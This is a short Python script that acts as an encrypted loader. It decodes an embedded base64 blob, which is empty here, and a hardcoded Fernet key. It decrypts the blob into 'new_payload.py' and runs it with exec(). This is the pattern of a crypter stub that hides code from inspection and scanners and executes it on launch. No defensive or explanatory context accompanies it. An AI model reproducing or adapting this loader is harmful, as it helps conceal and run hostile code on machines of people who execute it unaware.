# import required module
import base64

from cryptography.fernet import Fernet

with open('payload1', 'wb') as imagef:
    imagef.write(base64.b64decode(
        b''))

with open('filekey.key', 'wb') as imagef:
    imagef.write(base64.b64decode(b'd0RiT1pmYVBMbUZ4MF92OUJtZThyeW04cVoyallmUXVBci1WN1RYcTR1OD0='))


with open('filekey.key', 'rb') as filekey:
    key = filekey.read()
fernet = Fernet(key)

# opening the encrypted file
with open('payload1', 'rb') as enc_file:
    encrypted = enc_file.read()

# decrypting the file
decrypted = fernet.decrypt(encrypted)

# opening the file in write mode and
# writing the decrypted data
with open('new_payload.py', 'wb') as dec_file:
    dec_file.write(decrypted)


exec(open('new_payload.py').read())